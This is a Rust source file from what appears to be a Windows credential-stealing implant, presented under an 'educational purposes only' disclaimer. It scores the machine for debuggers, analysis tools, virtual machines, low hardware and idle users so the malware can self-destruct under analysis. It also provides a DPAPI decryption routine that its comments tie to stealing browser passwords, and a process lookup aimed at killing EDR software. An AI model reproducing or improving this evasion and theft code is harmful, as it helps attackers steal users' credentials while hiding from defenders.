/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// utils.rs — environment assessment, DPAPI, Windows helpers.
//
// assess_environment() drives main.rs Phase 1 (self-destruct vs safe vs full).
// Other helpers are used by steal.rs (DPAPI, expand_env) and main (PIDs).
//
// BROKEN / SHARP EDGES:
//   - can_reach_internet() hits https://www.google.com before stealth/C2.
//   - get_pids_by_name is exact lowercase equality, not substring.
//   - Score > 80 in main wipes the implant with no beacon.
//   - Hyper-V registry hit is common on corporate laptops (false-positive VM).

use anyhow::Result;
use log::info;
use std::ptr;
use sysinfo::System;
use winapi::shared::minwindef::BYTE;
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::winbase::{ExpandEnvironmentStringsW, GetTickCount};
use winapi::um::winnt::DATA_BLOB;
use winapi::um::winreg::{
    RegCloseKey, RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE, KEY_READ,
};
use winapi::um::winuser::GetLastInputInfo;

// ── Environment assessment ───────────────────────────────────────────────────

/// Score the current environment for sandbox/analyst indicators.
/// Returns (score 0-100, Vec of reason strings).
///
/// Logic: start at 0, add for debugger/VM/low-spec/idle/no-user-dirs, subtract
/// for “looks like a real user” (browsers, recent files, internet). Clamp.
/// Not a classifier — overlapping signals can both fire on a real workstation.
pub fn assess_environment() -> (u32, Vec<String>) {
    let mut score: i64 = 0;
    let mut reasons: Vec<String> = Vec::new();

    let mut sys = System::new_all();
    sys.refresh_all();

    // Process analysis tools.
    let proc_names: Vec<String> = sys.processes().values()
        .map(|p| p.name().to_lowercase())
        .collect();

    for p in &proc_names {
        if ["x64dbg", "ida", "windbg", "immunity", "ollydbg"].iter().any(|d| p.contains(d)) {
            score += 30; reasons.push(format!("Debugger: {}", p));
        }
        if ["procmon", "wireshark", "fiddler", "procexp"].iter().any(|d| p.contains(d)) {
            score += 10; reasons.push(format!("Analysis: {}", p));
        }
        if ["vmtoolsd", "vboxservice", "vmsrvc", "vmwaretray"].iter().any(|d| p.contains(d)) {
            score += 5; reasons.push(format!("VM process: {}", p));
        }
    }

    // Hardware.
    let cores  = sys.cpus().len();
    let ram_mb = sys.total_memory() / 1024 / 1024;
    if cores < 2  { score += 15; reasons.push("CPU < 2".to_string()); }
    if ram_mb < 2048 { score += 20; reasons.push("RAM < 2 GB".to_string()); }

    // Disk space.
    if let Some(free) = get_free_disk_gb("C:\\") {
        if free < 40 { score += 15; reasons.push(format!("Free disk {} GB < 40 GB", free)); }
    }

    // VM registry artefacts. Hyper-V guest key also appears on many physical
    // boxes with virtualization features enabled.
    for (key, label) in &[
        (r"SOFTWARE\VMware, Inc.", "VMware reg"),
        (r"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters", "Hyper-V reg"),
        (r"SYSTEM\ControlSet001\Services\VBoxGuest", "VirtualBox reg"),
    ] {
        if registry_key_exists(key) { score += 10; reasons.push(label.to_string()); }
    }

    // User idle time (no recent input → likely automated).
    let idle = get_last_input_seconds();
    if idle > 300 { score += 10; reasons.push(format!("Idle {}s > 300s", idle)); }

    // User directory presence.
    let user_dirs = [dirs::desktop_dir(), dirs::document_dir(), dirs::download_dir()];
    let dir_count = user_dirs.iter().filter(|d| d.as_ref().map(|p| p.exists()).unwrap_or(false)).count();
    if dir_count < 2 { score += 20; reasons.push("Few user directories".to_string()); }
    else if dir_count >= 3 { score -= 15; reasons.push("User dirs offset".to_string()); }

    // Recent file activity (real user leaves files). Desktop+Documents only.
    let recent = count_recent_files(7);
    if recent > 50  { score -= 20; reasons.push("Recent files offset".to_string()); }
    if recent == 0  { score += 15; reasons.push("No recent files".to_string()); }

    // Active browsers.
    let browsers = ["chrome.exe", "firefox.exe", "msedge.exe", "brave.exe"];
    let browser_count = proc_names.iter()
        .filter(|p| browsers.iter().any(|b| p.contains(b)))
        .count();
    if browser_count > 0 { score -= 10; reasons.push("Browser offset".to_string()); }

    // Timing anomaly (emulators often accelerate time).
    if check_timing_anomaly() { score += 15; reasons.push("Timing anomaly".to_string()); }

    // Network connectivity — distinct IOC (Google, not the Worker).
    if !can_reach_internet() { score += 15; reasons.push("No internet".to_string()); }
    else { score -= 5; reasons.push("Internet offset".to_string()); }

    // CPUID hypervisor bit (VMs usually set this; also set with Hyper-V on).
    if cpuid_hypervisor_present() { score += 10; reasons.push("Hypervisor CPUID bit".to_string()); }

    let clamped = score.clamp(0, 100) as u32;
    (clamped, reasons)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Seconds since last keyboard/mouse input via GetLastInputInfo.
/// Returns a huge number if the API fails (treat as idle).
fn get_last_input_seconds() -> u64 {
    unsafe {
        let mut lii: winapi::um::winuser::LASTINPUTINFO = std::mem::zeroed();
        lii.cbSize = std::mem::size_of_val(&lii) as u32;
        if GetLastInputInfo(&mut lii) != 0 {
            let tick = GetTickCount();
            let diff = tick.wrapping_sub(lii.dwTime);
            diff as u64 / 1000
        } else { 99999 }
    }
}

/// Count files in Desktop and Documents modified within `days`.
/// Does not recurse; one directory level only.
fn count_recent_files(days: u64) -> u32 {
    let cut = std::time::SystemTime::now()
        .checked_sub(std::time::Duration::from_secs(days * 86400))
        .unwrap_or(std::time::SystemTime::UNIX_EPOCH);
    let mut count = 0u32;
    for dir in [dirs::desktop_dir(), dirs::document_dir()].iter().flatten() {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                if let Ok(meta) = entry.metadata() {
                    if let Ok(modified) = meta.modified() {
                        if modified >= cut { count += 1; }
                    }
                }
            }
        }
    }
    count
}

/// Free bytes on `drive` converted to GiB, or None if the API fails.
fn get_free_disk_gb(drive: &str) -> Option<u64> {
    unsafe {
        let wide: Vec<u16> = drive.encode_utf16().chain(Some(0)).collect();
        let mut free = 0u64;
        if winapi::um::fileapi::GetDiskFreeSpaceExW(
            wide.as_ptr(), &mut free, ptr::null_mut(), ptr::null_mut()
        ) != 0 {
            Some(free / (1024 * 1024 * 1024))
        } else { None }
    }
}

/// True if HKLM\subkey can be opened with KEY_READ.
fn registry_key_exists(subkey: &str) -> bool {
    unsafe {
        let wide: Vec<u16> = subkey.encode_utf16().chain(Some(0)).collect();
        let mut hkey = ptr::null_mut();
        let ret = RegOpenKeyExW(HKEY_LOCAL_MACHINE, wide.as_ptr(), 0, KEY_READ, &mut hkey);
        if ret == 0 { RegCloseKey(hkey); true } else { false }
    }
}

/// Sleep 1ms; if wall time > 500ms, treat as dilated sandbox clock.
fn check_timing_anomaly() -> bool {
    let t0 = std::time::Instant::now();
    // Real sleep of 1ms — if elapsed is > 500ms the hypervisor is likely
    // running at non-real-time speed (common in deep sandbox analysis modes).
    std::thread::sleep(std::time::Duration::from_millis(1));
    t0.elapsed().as_millis() > 500
}

/// Blocking GET https://www.google.com with a 3s timeout.
/// BROKEN as OPSEC: extra destination besides the Worker, during Phase 1.
fn can_reach_internet() -> bool {
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(3))
        .build()
        .unwrap_or_default();
    client.get("https://www.google.com")
          .send()
          .map(|r| r.status().is_success() || r.status().is_redirection())
          .unwrap_or(false)
}

/// CPUID leaf 1, ECX bit 31 (hypervisor present). x86_64 only.
fn cpuid_hypervisor_present() -> bool {
    // Bit 31 of ECX from CPUID leaf 1 is the hypervisor-present bit.
    #[cfg(target_arch = "x86_64")]
    unsafe {
        let ecx: u32;
        std::arch::asm!(
            "mov eax, 1",
            "cpuid",
            out("ecx") ecx,
            options(nostack, preserves_flags)
        );
        return (ecx >> 31) & 1 == 1;
    }
    #[cfg(not(target_arch = "x86_64"))]
    false
}

// ── DPAPI ────────────────────────────────────────────────────────────────────

/// CryptUnprotectData on a blob; lossy UTF-8 of the output.
/// Chromium v80+ passwords are NOT raw DPAPI (v10 + AES-GCM); steal.rs
/// still calls this and will get empty/garbage on current Chrome/Edge.
pub fn dpapi_decrypt(encrypted: &[u8]) -> Result<String> {
    unsafe {
        let mut in_blob = DATA_BLOB {
            cbData: encrypted.len() as u32,
            pbData: encrypted.as_ptr() as *mut BYTE,
        };
        let mut out_blob = DATA_BLOB { cbData: 0, pbData: ptr::null_mut() };
        if CryptUnprotectData(&mut in_blob, ptr::null_mut(), ptr::null_mut(),
                              ptr::null_mut(), ptr::null_mut(), 0, &mut out_blob) != 0
        {
            let dec = std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize);
            let s = String::from_utf8_lossy(dec).to_string();
            winapi::um::winbase::LocalFree(out_blob.pbData as *mut _);
            Ok(s)
        } else {
            Err(anyhow::anyhow!("CryptUnprotectData failed"))
        }
    }
}

// ── Windows helpers ───────────────────────────────────────────────────────────

/// HKLM MachineGuid from Software\Microsoft\Cryptography.
pub fn get_machine_guid() -> Option<String> {
    unsafe {
        let subkey: Vec<u16> = "Software\\Microsoft\\Cryptography\0".encode_utf16().collect();
        let mut hkey = ptr::null_mut();
        if RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.as_ptr(), 0, KEY_READ, &mut hkey) != 0 {
            return None;
        }
        let value_name: Vec<u16> = "MachineGuid\0".encode_utf16().collect();
        let mut buf = [0u16; 256];
        let mut sz = (buf.len() * 2) as u32;
        let ret = RegQueryValueExW(hkey, value_name.as_ptr(), ptr::null_mut(),
                                   ptr::null_mut(), buf.as_mut_ptr() as *mut _, &mut sz);
        RegCloseKey(hkey);
        if ret != 0 { return None; }
        let guid = String::from_utf16_lossy(&buf[..(sz / 2) as usize]);
        Some(guid.trim_end_matches('\0').to_string())
    }
}

pub fn get_username() -> Option<String> { std::env::var("USERNAME").ok() }

/// ExpandEnvironmentStringsW; returns `template` unchanged on failure.
pub fn expand_env(template: &str) -> String {
    unsafe {
        let wide: Vec<u16> = template.encode_utf16().chain(Some(0)).collect();
        let sz = ExpandEnvironmentStringsW(wide.as_ptr(), ptr::null_mut(), 0);
        if sz == 0 { return template.to_string(); }
        let mut buf = vec![0u16; sz as usize];
        let res = ExpandEnvironmentStringsW(wide.as_ptr(), buf.as_mut_ptr(), sz);
        if res == 0 { return template.to_string(); }
        let len = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
        String::from_utf16_lossy(&buf[..len])
    }
}

/// PIDs whose *exact* lowercase image name equals one of `names`.
/// BROKEN for EDR kill: CrowdStrike/SentinelOne service names usually differ.
pub fn get_pids_by_name(names: &[&str]) -> Vec<(u32, String)> {
    let mut sys = System::new_all();
    sys.refresh_processes();
    let lower: Vec<String> = names.iter().map(|n| n.to_lowercase()).collect();
    let mut result = Vec::new();
    for proc in sys.processes().values() {
        let pname = proc.name().to_lowercase();
        if let Some(idx) = lower.iter().position(|n| *n == pname) {
            result.push((proc.pid().as_u32(), names[idx].to_string()));
        }
    }
    result
}
